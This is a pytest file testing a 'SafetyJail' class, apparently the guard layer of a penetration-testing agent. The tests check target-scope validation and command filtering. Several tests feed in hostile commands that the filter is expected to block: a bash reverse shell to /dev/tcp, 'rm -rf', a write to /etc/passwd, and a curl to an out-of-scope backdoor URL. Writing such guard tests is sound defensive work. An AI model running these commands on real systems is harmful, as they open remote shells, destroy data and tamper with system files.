"""Tests for ultron.safety — scope validation and command filtering."""

import ipaddress

import pytest

from ultron.safety import FORBIDDEN_PATTERNS, SafetyJail


@pytest.fixture()
def jail():
    return SafetyJail(
        allowed_targets={"example.com", "192.168.1.10"},
        allowed_networks=[
            ipaddress.ip_network("10.0.0.0/8"),
            ipaddress.ip_network("192.168.1.10/32"),
        ],
    )


def test_validate_scope_allows_exact_target(jail):
    assert jail.validate_scope("example.com") is True
    assert jail.validate_scope("192.168.1.10") is True


def test_validate_scope_allows_subdomain(jail):
    assert jail.validate_scope("www.example.com") is True


def test_validate_scope_rejects_unrelated_domain(jail):
    assert jail.validate_scope("evil.example.net") is False


def test_validate_scope_allows_ip_in_network(jail):
    assert jail.validate_scope("10.42.7.99") is True


def test_validate_scope_rejects_ip_outside_network(jail):
    assert jail.validate_scope("8.8.8.8") is False


def test_validate_scope_allows_empty_target(jail):
    assert jail.validate_scope("") is True


def test_safe_command_passes(jail):
    assert jail.filter_command("nmap -sV 10.42.7.99") == (True, "OK")


def test_rm_rf_is_blocked(jail):
    ok, reason = jail.filter_command("rm -rf /var/www")
    assert ok is False
    assert "BLOCKED" in reason


def test_reverse_shell_is_blocked(jail):
    ok, _ = jail.filter_command("bash -i >& /dev/tcp/1.2.3.4/4444")
    assert ok is False


def test_write_to_etc_is_blocked(jail):
    ok, _ = jail.filter_command("echo x > /etc/passwd")
    assert ok is False


def test_out_of_scope_ip_in_command_is_blocked(jail):
    ok, reason = jail.filter_command("curl http://8.8.8.8/backdoor")
    assert ok is False
    assert "out of scope" in reason


def test_in_scope_ip_in_command_passes(jail):
    assert jail.filter_command("curl http://10.1.2.3/health")[0] is True


def test_forbidden_patterns_are_compilable():
    import re

    for pattern in FORBIDDEN_PATTERNS:
        re.compile(pattern)
